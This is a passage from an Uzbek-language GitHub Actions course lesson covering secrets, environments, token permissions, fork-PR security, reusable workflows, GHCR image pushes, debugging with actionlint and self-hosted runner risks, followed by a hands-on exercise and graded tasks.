**Maskalash** runner'dagi oddiy matn filtri: runner job'ga berilgan secret qiymatlarini biladi va log'ga chiqayotgan har qatorda aynan shu satrlarni `***` ga almashtiradi. U qiymatning ma'nosini emas, aniq ko'rinishini qidiradi; bundan nima kelib chiqishini 14-vazifada sinaysiz. `if:` ichida `secrets` context'ini to'g'ridan ishlatib bo'lmaydi, avval `env` ga oling. Fork'dan kelgan `pull_request` run'iga secret'lar uzatilmaydi (8-bo'lim).

### Environment va approval

**Environment** (1-dars) GitHub'da deploy nishoni obyekti (Settings → Environments). Job uni e'lon qiladi:

```yaml
publish-docs:
  runs-on: ubuntu-24.04
  environment:
    name: docs-site
    url: https://docs.example.com
  steps:
    - run: echo "Publishing to ${{ vars.SITE_BUCKET }}"
```

Environment'ga biriktiriladi: o'z secret va variable'lari (bir xil nom repo darajasidagini yopadi), **required reviewers**, wait timer, **deployment branches** (qaysi branch yoki tag'dan deploy mumkin). Mexanizm: job runner'ga yuborilishidan oldin GitHub qoidalarni tekshiradi. Reviewer talab qilinsa run `waiting` holatida to'xtaydi, run sahifasida "Review deployments" tugmasi chiqadi, environment secret'lari esa faqat tasdiqdan keyin job'ga beriladi. Branch qoidasiga mos kelmagan ref'dan kelgan job boshlanmasdan rad etiladi. Repo'ning Deployments bo'limida kim nimani qachon chiqargani saqlanadi.

### Real ishda qachon kerak

- Production kalitlari environment secret'ida: PR'dagi `test` job'i ularni umuman ololmaydi, faqat `environment: production` e'lon qilgan va tasdiqlangan job oladi.
- Bir xil workflow, turli muhit: URL, bucket nomi kabi ochiq sozlamalar `vars` da, har environment'da o'z qiymati bilan.

### Nima uchun shunday

Secret'ni qayta o'qib bo'lmasligi oqib chiqish yuzasini kamaytiradi: repo admin'i ham qiymatni UI'dan ko'ra olmaydi, faqat almashtira oladi. Approval'ning job darajasida turishi 1-darsdagi gate: artefakt bir marta quriladi, promotion esa insoniy qaror. Muqobili alohida "release" branch'lar va qo'lda ishga tushirish, lekin unda kim tasdiqlagani haqida iz qolmaydi.

## 8. `GITHUB_TOKEN`, permissions va fork PR'lar

### Token hayoti

Har job boshida GitHub avtomatik **`GITHUB_TOKEN`** yaratadi: faqat shu repo uchun, job tugashi bilan (yoki belgilangan maksimal muddatdan keyin) bekor bo'ladi. U `secrets.GITHUB_TOKEN` va `github.token` orqali o'qiladi; `actions/checkout` uni standart holatda o'zi ishlatadi. **PAT** (personal access token, git moduli 4-dars) bilan farqi: PAT uzoq yashaydi va egasining ko'p repo'lariga huquq beradi, o'g'irlansa zarar katta.

Token huquqlari `permissions` bilan cheklanadi, workflow yoki job darajasida:

```yaml
permissions:
  contents: read
jobs:
  publish:
    permissions:
      contents: read
      packages: write
```

- `permissions` yozilgan zahoti sanalmagan barcha scope'lar `none` bo'ladi. Job darajasidagi blok workflow darajasidagini to'liq almashtiradi, qo'shmaydi.
- Ko'p uchraydigan scope'lar: `contents` (repo), `packages` (GHCR), `pull-requests`, `issues`, `id-token` (OIDC, 5-darsda), `actions`.
- Job'ga berilgan haqiqiy huquqlar "Set up job" guruhida `GITHUB_TOKEN Permissions` ostida ko'rinadi. Huquq yetmagan API chaqiruvi HTTP 403 va `Resource not accessible by integration` xabari bilan qaytadi.
- `GITHUB_TOKEN` bilan qilingan push yoki PR yangi workflow run'ini boshlamaydi (cheksiz sikldan himoya).

### Fork PR va `pull_request_target`

Public repo'ga har kim fork'dan PR yubora oladi va PR workflow faylini ham o'zgartirishi mumkin. Shuning uchun fork'dan kelgan `pull_request` run'ida: PR'dagi kod va PR'dagi workflow ishlaydi, lekin secret'lar uzatilmaydi va `GITHUB_TOKEN` faqat o'qiy oladi. Begona kod ishlaydi, ammo o'g'irlaydigan narsa yo'q. Birinchi marta hissa qo'shuvchining run'i maintainer tasdig'ini ham kutadi.

`pull_request_target` teskarisi: workflow fayli va kod **base** branch'dan olinadi (PR uni o'zgartira olmaydi), evaziga secret'lar va yozish huquqli token beriladi. U PR'ga label qo'yish yoki komment yozish kabi, PR kodini bajarmaydigan ishlar uchun.

**Tuzoq: `pull_request_target` bilan PR kodini checkout qilish.** Agar bunday workflow `actions/checkout` ga `ref: ${{ github.event.pull_request.head.sha }}` berib fork kodini olsa va uni bajarsa (`npm install` dagi `postinstall`, `make`, test), begona kod sizning secret'laringiz bilan ishlaydi. Aniq zarurat bo'lmasa bu trigger'ni ishlatmang.

### Real ishda qachon kerak

- Workflow boshida `contents: read`, kengroq huquq faqat kerakli job'da: buzilgan action (3-bo'lim) shu job token'idan ortig'ini ololmaydi.
- Boshqa repo'ga yozish yoki yangi run boshlash kerak bo'lsa `GITHUB_TOKEN` yetmaydi; bunda GitHub App token'i yoki tor doirali (fine-grained) PAT ishlatiladi.

### Nima uchun shunday

Qisqa yashaydigan, bitta repo'ga bog'langan token "o'g'irlansa nima bo'ladi" savoliga eng yaxshi javob: bir necha daqiqadan keyin u yaroqsiz. Tarixan standart token keng yozish huquqiga ega edi, keyin GitHub yangi repo'lar uchun standartni read-only qildi; eski repo va organization'larda hali ham keng bo'lishi mumkin, shuning uchun `permissions` har doim aniq yoziladi. Fork PR cheklovi ochiq kodli loyihalar uchun murosa: begona hissa avtomatik tekshiriladi, lekin sirlarga yaqinlashmaydi.

## 9. Qayta ishlatish: reusable workflow va composite action

| | Reusable workflow | Composite action |
|-|-------------------|------------------|
| Nima | butun workflow (job'lar bilan) | step'lar to'plami |
| Ta'rif | `on: workflow_call` | `action.yml`, `runs.using: composite` |
| Chaqirish | job darajasida `uses:` | step darajasida `uses:` |
| Runner | o'z job'lari, o'z VM'lari | chaqirgan job'ning VM'ida |
| Secret | `secrets:` bilan aniq yoki `secrets: inherit` | `secrets` context'i yo'q, `inputs` orqali |

### Mexanizm

**Reusable workflow** chaqirilganda GitHub uning job'larini chaqiruvchi run'ning grafiga qo'shadi (run sahifasida `caller / inner-job` nomi bilan). Kirish `inputs`, chiqish `outputs` orqali, ikkalasi `on.workflow_call` ostida e'lon qilinadi:

```yaml
# .github/workflows/link-check.yml
on:
  workflow_call:
    inputs:
      path: { type: string, required: true }
    outputs:
      broken:
        value: ${{ jobs.check.outputs.broken }}
jobs:
  check:
    runs-on: ubuntu-24.04
    outputs:
      broken: ${{ steps.scan.outputs.broken }}
    steps: [...]
```

```yaml
# caller
jobs:
  docs-links:
    uses: ./.github/workflows/link-check.yml
    with:
      path: docs/
```

Output uch pog'onadan o'tadi: step, job, workflow. `uses:` li job'da `steps` va `runs-on` yozilmaydi. Chaqirilgan workflow'ning token huquqlari chaqiruvchinikidan oshmaydi, `github` context'i esa chaqiruvchiniki.

**Composite action** `action.yml` fayli bo'lgan papka. Uning step'lari chaqirgan job ichida, o'sha VM'da bajariladi. Har `run` step'ida `shell:` yozish majburiy. Repo ichidagi action `uses: ./.github/actions/<nom>` bilan chaqiriladi, shuning uchun undan oldin `actions/checkout` bo'lishi shart.

### Real ishda qachon kerak

- Bir necha repo'da bir xil "test, build, push" zanjiri: bitta markaziy repo'dagi reusable workflow (`owner/repo/.github/workflows/x.yml@ref`), o'zgarish bir joyda.
- Bir necha job'da takrorlanadigan 3–4 step (runtime o'rnatish va cache): composite action.

### Nima uchun shunday

O'xshatish haqiqiy: composite action umumiy npm paketidagi funksiyaga o'xshaydi (sizning jarayoningiz ichida ishlaydi), reusable workflow esa alohida servisni chaqirishga (o'z mashinasi, aniq shartnoma). Ikkisi bor, chunki chegaralar boshqa: job chegarasi izolyatsiya va alohida permissions beradi, step chegarasi esa arzon va fayllarni bo'lishadi. Muqobili YAML anchor yoki nusxalash, ikkalasi ham repo'lar orasida ishlamaydi.

## 10. Docker image'ni GHCR'ga push qilish

**GHCR** (`ghcr.io`) GitHub'ning container registry'si (registry: docker moduli, 2-dars). `GITHUB_TOKEN` ga `packages: write` berilsa, alohida secret kerak emas.

```yaml
- uses: docker/login-action@v<N>
  with:
    registry: ghcr.io
    username: ${{ github.actor }}
    password: ${{ secrets.GITHUB_TOKEN }}
- uses: docker/build-push-action@v<N>
  with:
    context: .
    push: true
    tags: ghcr.io/<owner>/notes-api:${{ github.ref_name }}
```

Bu fragment tag push'ida (`on.push.tags`) ishlaydigan release job'i uchun: `github.ref_name` tag nomi (`v1.4.0`). Birinchi step `docker login` ni bajaradi, ikkinchisi BuildKit bilan image qurib push qiladi. `push:` va `tags:` oddiy expression qabul qiladi, shuning uchun "qaysi hodisada push qilinadi" shartini o'zingiz yozasiz (15-vazifa).

- Image nomi kichik harflarda bo'lishi shart. Owner yoki repo nomida katta harf bo'lsa `ghcr.io/${{ github.repository }}` xato beradi; `docker/metadata-action` nom va tag'larni to'g'ri hosil qiladi.
- PR'da image qurish foydali (Dockerfile buzilmaganini tekshiradi), lekin push emas: fork PR'ida yozish huquqi yo'q va tekshirilmagan kod registry'ga tushmasligi kerak.
- Deploy uchun tag commit SHA (1-darsdagi immutable tag). `latest` qo'shimcha qulaylik bo'lishi mumkin, lekin deploy unga tayanmaydi.
- Yangi package standart holatda private va uni yaratgan repo'ga bog'lanadi. Ko'rinishi package sozlamalaridan o'zgartiriladi.
- Layer cache: har job toza VM'da bo'lgani uchun lokal Docker layer cache'i yo'q. `docker/setup-buildx-action` dan keyin `cache-from: type=gha` va `cache-to: type=gha,mode=max` layer'larni GitHub cache'ida saqlaydi; log'da qayta ishlatilgan qadamlar `CACHED` deb belgilanadi.

**Arxitektura.** `ubuntu-latest` runner `x86_64`, unda qurilgan image `linux/amd64`. Zorin'da u to'g'ridan ishlaydi. Mac'da (`arm64`) `docker pull` qilinsa, image emulyatsiya ostida ishlaydi va `requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8)` ogohlantirishi chiqadi. Ikkala arxitektura uchun bitta tag kerak bo'lsa, workflow multi-platform image quradi: `docker/setup-qemu-action`, `docker/setup-buildx-action` va `build-push-action` da `platforms: linux/amd64,linux/arm64`. Natija manifest list (docker moduli, 2-dars): har mashina o'z arxitekturasini oladi. Narxi: emulyatsiya ostidagi build ancha sekin.

### Real ishda qachon kerak

Har deploy shu yerdan boshlanadi: 5-darsda server aynan shu registry'dan, aynan shu SHA tag'i bilan image tortadi. Mac'da ishlab, `amd64` serverga chiqaradigan jamoalarda arxitektura xatosi (`exec format error`) eng ko'p uchraydiganlardan.

### Nima uchun shunday

GHCR'ning `GITHUB_TOKEN` bilan ishlashi registry parolini secret sifatida saqlash zaruratini yo'q qiladi: eng yaxshi secret bu mavjud bo'lmagan secret. Muqobil Docker Hub yoki cloud registry (ECR), ularga uzoq yashaydigan parol o'rniga OIDC bilan kirish 5-darsda.

## 11. Debug va `actionlint`

### Run'ni terminaldan o'qish

```
$ gh run list --limit 3
STATUS  TITLE          WORKFLOW  BRANCH  EVENT         ID          ELAPSED  AGE
X       Fix parser     checks    fix-1   pull_request  <run-id>    48s      <vaqt>
$ gh run view <run-id> --log-failed
unit	Run tests	<timestamp> --- FAIL: TestParse (0.00s)
unit	Run tests	<timestamp> ##[error]Process completed with exit code 1.
```

`gh run list` da `X` yiqilgan run (yashil `✓` muvaffaqiyatli, `*` ishlab turibdi). `--log-failed` faqat yiqilgan step'larning log'ini beradi, har qator: job nomi, step nomi, vaqt, matn. Xatoning o'zi odatda `##[error]` qatoridan yuqorida.

- `gh run watch` jonli kuzatish, `gh run view <id> --web` brauzerda ochish.
- `gh run rerun <id> --failed` faqat yiqilgan job'larni (va ularga bog'liqlarni) qayta ishga tushiradi, **o'sha commit va o'sha workflow fayli** bilan. `gh run rerun <id> --debug` debug log bilan.
- Doimiy debug log: repo'da `ACTIONS_STEP_DEBUG` ni `true` qilib qo'yish (secret yoki variable); log'da `##[debug]` qatorlari paydo bo'ladi.
- Qo'lda ishga tushirish: `gh workflow run <fayl>.yml --ref my-branch -f key=value` (`workflow_dispatch` kerak).

### `actionlint`

GitHub workflow xatosini faqat push'dan keyin, ba'zilarini esa umuman aytmaydi (4-bo'lim: yo'q maydon bo'sh satr). `actionlint` faylni lokal o'qib YAML tuzilishini, kalit nomlarini, expression turlarini, `needs` bog'lanishlarini va `run:` ichidagi shell'ni (shellcheck orqali) tekshiradi. Chiqish formati `fayl:qator:ustun: xabar [qoida-nomi]`, toza bo'lsa hech narsa chiqmaydi va exit code `0`.

### Real ishda qachon kerak

Eng samarali debug usuli 1-darsdan: mantiq `Makefile` da bo'lsa, xatoni lokal `make test` bilan takrorlaysiz va "commit, push, 3 daqiqa kut" siklidan qutulasiz. Workflow'ning o'ziga xos qismi (trigger, permissions, secret) uchun esa `actionlint` va `--log-failed`.

### Nima uchun shunday

Hosted runner'ga SSH bilan kirib bo'lmaydi va VM job'dan keyin yo'q, shuning uchun yagona iz log va artifact. Workflow'ni lokal to'liq ishlatadigan rasmiy vosita yo'q (norasmiy `act` taqribiy emulyatsiya), shu sababli statik tekshiruv va lokal takrorlanadigan `make` target'lari asosiy tayanch.

## 12. Self-hosted runner

### Nima va qanday ulanadi

Self-hosted runner bu o'z mashinangizda ishlaydigan o'sha runner dasturi. U GitHub'ga chiquvchi HTTPS ulanish ochib job kutadi (long polling), kiruvchi port ochish kerak emas. Label'lar orqali tanlanadi: `runs-on: [self-hosted, linux, x64]`. Qachon kerak: yopiq tarmoqdagi resurslarga kirish, maxsus apparat (GPU, ARM), katta cache, hosted daqiqalar narxi.

Ro'yxatdan o'tkazish: repo Settings → Actions → Runners → "New self-hosted runner" sahifasi OS va arxitekturaga mos yuklab olish buyruqlarini va bir martalik token'ni ko'rsatadi; asosiy qadamlar `./config.sh --url https://github.com/<owner>/<repo> --token <TOKEN> --ephemeral` va `./run.sh`. Token qisqa muddatli, uni README'ga yozmang.

### Xavflari

- **Runner workflow'dagi ixtiyoriy kodni o'zi turgan mashinada bajaradi.** Public repo'da har kim fork ochib PR yuborishi va workflow orqali sizning mashinangizda kod ishlatishi mumkin.
- Hosted runner har job'dan keyin yo'q qilinadi, self-hosted standart holatda doimiy: oldingi job'dan qolgan fayllar, Docker image'lar, credential'lar keyingi job'ga ko'rinadi.
- Runner jarayoni mashinadagi tarmoqqa, Docker socket'ga (docker moduli: socket root huquqiga teng), cloud metadata endpoint'iga kira oladi.
- Yumshatish: ephemeral runner (bitta job, keyin ro'yxatdan chiqadi), alohida izolyatsiyalangan VM, eng kam huquq, runner group'lar, runner dasturini yangilab turish.

### Bu kursda qoida

Runner faqat konteyner ichida (root bo'lmagan user bilan, host'ning Docker socket'i ulanmagan), faqat o'zingizning sinov repo'ngiz uchun ishga tushiriladi va dars oxirida o'chiriladi (`./config.sh remove` yoki Settings sahifasi, keyin `docker rm`). Ro'yxat har mashinada alohida: ofisda qoldirilgan runner uyda `Offline`, unga mo'ljallangan job `Waiting for a runner to pick up this job...` da cheksiz turadi. Mac'da konteyner `arm64`, sahifada ARM64 variantini tanlang; unda qurilgan image ham `arm64` bo'ladi.

### Nima uchun shunday

Chiquvchi ulanish modeli runner'ni NAT va firewall ortida (network moduli, 6-dars) hech narsa ochmasdan ishlatish imkonini beradi. Narxi: mashina endi "GitHub'dagi repo'ga yozish huquqi bor har kim" ga ishonadi. GitLab runner (3-dars) va Jenkins agent (4-dars) ham shu modelda, xavfi ham bir xil.

## Atamalar

| Atama | Ta'rif |
|-------|--------|
| Event (hodisa) | workflow'ni ishga tushiradigan voqea: push, PR, cron, qo'lda chaqirish |
| Workflow | `.github/workflows/` dagi YAML fayl, pipeline ta'rifi |
| Run | workflow'ning bitta hodisa uchun bajarilishi |
| Job | bitta runner'da ketma-ket bajariladigan step'lar guruhi |
| Step | job ichidagi bitta qadam: `uses` (action) yoki `run` (shell) |
| Runner | job'ni bajaradigan mashina va undagi agent dastur |
| Action | boshqa repo'dan `owner/repo@ref` bilan chaqiriladigan qayta ishlatiladigan step |
| Pin by SHA | action'ni o'zgarmas to'liq commit SHA bilan ko'rsatish |
| Context | run haqidagi ma'lumot obyekti (`github`, `secrets`, `matrix`) |
| Expression | `${{ }}` ichidagi, shell'dan oldin hisoblanadigan ifoda |
| Script injection | tashqi qiymat `run:` matniga qo'yilib shell kodi sifatida bajarilishi |
| Matrix | bitta job ta'rifidan kombinatsiyalar bo'yicha bir nechta job hosil qilish |
| Cache | kalit bo'yicha saqlanadigan, tezlik uchun kerak papka nusxasi |
| Artifact | run'ga biriktirilgan natija fayllari |
| Job output | job'dan `needs` orqali o'qiladigan kichik satr |
| Secret | shifrlab saqlanadigan, log'da maskalanadigan qiymat |
| Variable (`vars`) | ochiq saqlanadigan konfiguratsiya qiymati |
| Environment | o'z secret'lari va himoya qoidalari bor deploy nishoni |
| Required reviewers | job boshlanishidan oldin inson tasdig'ini talab qiladigan qoida |
| `GITHUB_TOKEN` | har job uchun avtomatik yaratiladigan qisqa muddatli repo token'i |
| `permissions` | `GITHUB_TOKEN` huquqlarini scope bo'yicha cheklovchi kalit |
| Reusable workflow | `workflow_call` bilan boshqa workflow'dan chaqiriladigan workflow |
| Composite action | `action.yml` da yozilgan step'lar to'plami |
| Concurrency group | bir vaqtda faqat bittasi ishlaydigan run'lar guruhi |
| GHCR | GitHub'ning container registry'si (`ghcr.io`) |
| Self-hosted runner | o'z mashinangizda ishlaydigan runner |
| Ephemeral runner | bitta job bajarib ro'yxatdan chiqadigan runner |

## Tuzoqlar

- `permissions` yozmaslik. Repo sozlamasiga qarab token keng yozish huquqiga ega bo'lishi mumkin, buzilgan action undan foydalanadi.
- Uchinchi tomon action'ini tag bilan (`@v1`, `@main`) ishlatish. Tag ko'chirilsa begona kod secret'laringiz bilan ishlaydi.
- `${{ github.event.* }}` ni `run` ichiga to'g'ridan qo'yish (script injection).
- `pull_request_target` da PR kodini checkout qilib bajarish.
- Deploy job'ini `cancel-in-progress: true` guruhiga qo'yish.
- Cache kalitiga lockfile hash'ini qo'shmaslik: dependency o'zgaradi, cache esa eski.
- `if: always()` ni deploy step'iga qo'yish: testlar yiqilgan bo'lsa ham deploy bo'ladi.
- Public repo'ga self-hosted runner ulash; ofisdagi runner'ga bog'langan job'ni uydan kutish.
- Secret'ni `echo` bilan "tekshirish": maskalashga ishonib log'ga chiqarilgan secret oshkor bo'lgan deb hisoblanadi va almashtiriladi.
- `ubuntu-latest` va `node-version: latest`: pipeline kod o'zgarmasa ham bir kuni buziladi.
- Expression'da xato yozilgan maydon nomi (`github.ref_nmae`) xato bermaydi, bo'sh satr qaytaradi.
- Mac'da CI qurgan `amd64` image'ni "sekin ishlayapti" deb ilovadan qidirish: sabab emulyatsiya.
- Job nomini o'zgartirib, branch protection'dagi eski check nomini unutish: PR abadiy "kutilmoqda" da qoladi.

## Manbalar

- https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions – workflow sintaksisi (asosiy ma'lumotnoma)
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions – xavfsizlik bo'yicha qo'llanma (majburiy)
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication – `GITHUB_TOKEN` va permissions
- https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs – context'lar
- https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows – cache
- https://docs.github.com/en/actions/sharing-automations/reusing-workflows – reusable workflow
- https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment – environment'lar
- https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-container-registry – GHCR
- https://docs.github.com/en/actions/hosting-your-own-runners – self-hosted runner'lar
- https://docs.github.com/en/billing – daqiqalar, saqlash hajmi va narxlar (raqamlar shu yerdan)
- https://github.com/actions/runner-images – hosted runner image'larida nima o'rnatilgan
- https://cli.github.com/manual/gh_run – `gh run`
- https://github.com/rhysd/actionlint – actionlint
- https://github.com/actions/checkout, https://github.com/actions/cache – rasmiy action'lar (Releases sahifasida joriy versiya)
- https://github.com/docker/build-push-action – Docker build va push action

## Birga bajaramiz

Vazifalardagi Node ilovasidan boshqa, ataylab mayda misol: ikkita shell skriptli `hello-ci` sinov reposi. Maqsad to'liq siklni bir marta ko'rish: yozish, lint, push, kuzatish, buzish, log o'qish, tuzatish, tozalash. Hammasi host'da, ikkala mashinada bir xil.

1. GitHub'da public `hello-ci` reposini yarating va clone qiling (git moduli, 4-dars). Ichiga ikki fayl:

```
$ cat greet.sh
#!/usr/bin/env bash
echo "Hello, ${1:-world}!"
$ cat test.sh
#!/usr/bin/env bash
set -eu
out="$(bash greet.sh CI)"
[ "$out" = "Hello, CI!" ] || { echo "FAIL: got '$out'"; exit 1; }
echo "PASS"
$ bash test.sh
PASS
```

Avval lokal ishlashiga ishonch hosil qildik: CI lokal ishlamaydigan narsani tuzatmaydi.

2. `.github/workflows/check.yml` yozing (ichida ataylab bitta xato bor):

```yaml
name: check
on:
  push:
permissions:
  contents: read
jobs:
  syntax:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v<N>
      - run: bash -n greet.sh test.sh
  test:
    needs: sintax
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v<N>
      - id: t
        run: echo "result=$(bash test.sh)" >> "$GITHUB_OUTPUT"
      - run: echo "Test result: ${{ steps.t.outputs.result }}" >> "$GITHUB_STEP_SUMMARY"
```

`@v<N>` o'rniga joriy major tag'ni 3-bo'limdagi buyruq bilan toping. `bash -n` skriptni bajarmasdan sintaksisini tekshiradi.

3. Push'dan oldin lint:

```
$ actionlint
.github/workflows/check.yml:13:12: job "test" needs job "sintax" which does not exist in this workflow [job-needs]
```

Fayl, qator va ustun, xabar, kvadrat qavsda qoida nomi (xabar matni versiyaga qarab biroz farq qilishi mumkin). Push qilinganda GitHub ham bu faylni rad etardi, lekin buni bir daqiqadan keyin, run ro'yxatidagi "workflow file issue" yozuvidan bilardingiz. `sintax` ni `syntax` ga tuzating, `actionlint` jim bo'lsin.

4. Commit, push va kuzatish:

```
$ git add . && git commit -m "Add check workflow" && git push
$ gh run watch
```

Push rad etilsa va xabarda `workflow` scope tilga olinsa: `gh auth refresh -s workflow` (Laboratoriya). `gh run watch` ishlab turgan run'ni tanlashni so'raydi va job'lar ro'yxatini jonli yangilaydi: avval `syntax`, u tugagach `test` boshlanadi (`needs`), har job ostida step'lar, jumladan siz yozmagan "Set up job" va "Complete job". Tugagach `gh run view <run-id> --web` da run sahifasining pastida "Test result: PASS" summary'sini ko'ring.

5. Ataylab buzamiz: `greet.sh` dagi `Hello` ni `Hi` ga almashtiring (`test.sh` ga tegmang), commit va push qiling.

```
$ gh run list --limit 2
STATUS  TITLE               WORKFLOW  BRANCH  EVENT  ID         ELAPSED  AGE
X       Change greeting     check     main    push   <run-id>   <N>s     <vaqt>
✓       Add check workflow  check     main    push   <run-id>   <N>s     <vaqt>
$ gh run view <run-id> --log-failed
test	Run echo "result=$(bash test.sh)" >> "$GITHUB_OUTPUT"	<timestamp> ##[error]Process completed with exit code 1.
```

`syntax` yashil (sintaksis to'g'ri), `test` qizil. Lekin log'da `FAIL: got ...` qatori yo'q: `$(...)` skript chiqishini ushlab oldi, `test.sh` yiqilgach `bash -e` step'ni to'xtatdi va xabar hech qayerga yozilmadi. Saboq: CI'da xato matni stdout yoki stderr'ga chiqishi kerak, aks holda faqat exit code qoladi. Uchinchi step esa umuman ishlamadi (yashirin `if: success()`).

6. Tuzatish ikki qismli: `t` step'ini `bash test.sh | tee result.txt` ko'rinishiga keltiring va output'ni keyingi qatorda `result.txt` dan yozing (chiqish endi log'da ham ko'rinadi), `greet.sh` ni qaytaring. `actionlint`, commit, push, `gh run watch`: yashil. Bir narsaga e'tibor bering: `|` bilan step exit code'i `tee` niki bo'ladi, shuning uchun step'ga `shell: bash` qo'shing (u `-o pipefail` ni yoqadi, 1-bo'limdagi standart `bash -e` da u yo'q). Ishonch uchun `greet.sh` ni yana bir marta buzib, endi `FAIL` qatori log'da chiqishini va step qizil bo'lishini tekshiring.

7. Tozalash: sinov reposini o'chiring (repo Settings → Delete this repository, yoki `gh auth refresh -s delete_repo` dan keyin `gh repo delete <owner>/hello-ci`).

Shu 7 qadamda ko'rganingiz: hodisa run yaratdi va job'lar toza VM'larda ishladi (1-bo'lim), `needs` tartib berdi, step output va summary fayl orqali o'tdi, yiqilgan step keyingisini o'tkazib yubordi (2-bo'lim), action versiyasini o'zingiz topdingiz (3-bo'lim), expression step boshlanishidan oldin qiymatga almashdi (4-bo'lim), token `contents: read` bilan cheklangan edi (8-bo'lim), `actionlint` va `--log-failed` xatoni ikki xil bosqichda ushladi (11-bo'lim).

---

## Vazifalar

Workflow'lar `cicd-demo` reposida yoziladi. Javoblar `cicd/02-github-actions/` da (yaratish: `make new m=cicd n=02 name=github-actions`), shu papkadagi `README.md` ga `## N. Title` sarlavhalari ostida: bajarilgan buyruqlar, run havolasi, log'ning muhim qismi va o'z so'zingiz bilan izoh. Workflow fayllarining yakuniy nusxasini ham shu papkaga saqlang. Barcha `gh`, `git`, `actionlint` buyruqlari host'da, ikkala mashinada bir xil; mashinani almashtirganda `cicd-demo` ni clone qiling va `gh auth status` ni tekshiring, boshqa tiklash yo'q. Action'lar 11-vazifagacha joriy major tag bilan, 12-vazifadan keyin SHA bilan.

### A. Birinchi workflow

1. **Repo setup.** `gh repo create` bilan public `cicd-demo` reposini yarating, 1-darsdagi `app/`, `Dockerfile`, `Makefile` ni ko'chirib push qiling. `main` uchun branch protection (yoki ruleset) yoqing: to'g'ridan push taqiqlangan, PR va status check talab qilinadi (check nomini 2-vazifadan keyin qo'shasiz). Yo'nalish: Laboratoriya; 1-bo'lim, "Real ishda qachon kerak".

2. **First workflow.** `.github/workflows/ci.yml` yozing: `push` (`main`) va `pull_request` da `lint` va `test` job'lari parallel ishlasin, ikkalasi ham `Makefile` target'larini chaqirsin. PR ochib run'ni `gh run watch` bilan kuzating. Runner'da qaysi OS va qaysi Docker versiyasi borligini log'dan toping. Yo'nalish: 1-bo'lim, "Misol: bitta workflow, qatorma-qator".

3. **Break and read.** Testni ataylab buzib push qiling. `gh run view --log-failed` bilan faqat xato qismini oling. PR'ni merge qilib bo'ladimi? `gh run rerun --failed` nima qilishini kod tuzatilmagan holatda sinab ko'ring va natijani izohlang. Yo'nalish: 11-bo'lim, "Run'ni terminaldan o'qish".

4. **actionlint.** Workflow'ga ataylab uch xil xato kiriting: noto'g'ri kalit nomi, mavjud bo'lmagan context maydoni, `run` ichida shellcheck ushlaydigan xato. `actionlint` ni konteynerda (yoki Laboratoriya'dagi binary bilan, `shellcheck` o'rnatilgan bo'lsa) ishga tushirib har birini qanday xabar bilan topganini yozing. Qaysi xatoni GitHub push'dan keyin ham topmagan bo'lardi? Yo'nalish: 11-bo'lim, "`actionlint`"; 4-bo'lim.

5. **Contexts dump.** Alohida `debug.yml` (`workflow_dispatch`) yozing: `github`, `runner` va `job` context'larini `toJSON` bilan chop etsin. `gh workflow run` bilan ishga tushiring. `github.ref`, `github.ref_name`, `github.sha`, `github.event_name` qiymatlarini push va PR run'lari uchun taqqoslang. PR run'ida `github.sha` qaysi commit va nima uchun u branch'ingizdagi oxirgi commit emas? Yo'nalish: 4-bo'lim, "Nima va qachon hisoblanadi" va "Real ishda qachon kerak".

### B. Tezlik va natijalar

6. **Matrix.** `test` job'ini Node'ning ikki LTS versiyasi bo'yicha matrix qiling. Bitta versiyada yiqiladigan test yozib (masalan `process.version` ga qarab), `fail-fast: true` va `false` holatlarida run qanday ko'rinishini taqqoslang. Yo'nalish: 5-bo'lim.

7. **Cache.** npm cache qo'shing (`actions/cache` bilan qo'lda, `setup-node` ning `cache` parametrisiz). Uch run qiling: birinchi (cache miss), ikkinchi (hit), `package-lock.json` o'zgargandan keyin (miss, `restore-keys` bilan qisman). Har birida "Cache restored/saved" log qatorlari va dependency o'rnatish vaqtini yozing. `gh cache list` natijasini ko'rsating. Yo'nalish: 6-bo'lim, "Cache mexanizmi".

8. **Artifacts.** Test job'i JUnit yoki TAP hisobotini va coverage'ni artifact sifatida yuklasin, testlar yiqilganda ham (`if` sharti qanday bo'lishi kerak?). `gh run download` bilan lokal oling. `retention-days` ni 3 qilib qo'ying va nima uchun standart 90 kun har doim ham to'g'ri emasligini yozing. Yo'nalish: 6-bo'lim, "Artifact"; 2-bo'lim, "`if` va holat funksiyalari".

9. **Job outputs.** `build` job'i qisqa SHA asosida image tag'ini hisoblab `outputs` orqali chiqarsin, keyingi job uni `needs.build.outputs.*` dan o'qib `$GITHUB_STEP_SUMMARY` ga yozsin. Output va artifact qachon qaysi biri ishlatilishini izohlang. Yo'nalish: 2-bo'lim, "Step va job output'lari".

10. **Concurrency.** PR branch'iga 30 soniya ichida uch marta push qiling. Avval `concurrency` siz, keyin `cancel-in-progress: true` bilan. Nechta run to'liq ishladi? Deploy job'i uchun qanday `concurrency` sozlamasi kerak va nima uchun boshqacha? Yo'nalish: 2-bo'lim, "Concurrency".

### C. Xavfsizlik

11. **Token permissions.** Workflow boshiga `permissions: contents: read` qo'ying. Bitta step'da `gh` yoki `curl` orqali `GITHUB_TOKEN` bilan PR'ga komment yozishga urinib ko'ring, xatoni o'qing, so'ng faqat o'sha job'ga kerakli minimal permission'ni qo'shing. Repo sozlamalarida standart token huquqi qayerda belgilanishini toping. Yo'nalish: 8-bo'lim, "Token hayoti".

12. **Pin by SHA.** Workflow'dagi barcha action'larni to'liq commit SHA bilan pin qiling (versiya komment'i bilan). SHA'ni qanday topganingizni yozing. `.github/dependabot.yml` qo'shib `github-actions` ekotizimini yoqing. Tag bilan pin qilishning aniq hujum ssenariysini 3–4 gapda tasvirlang. Yo'nalish: 3-bo'lim, "Xavf: tag ko'chadi" va "Joriy relizni va SHA'ni topish".

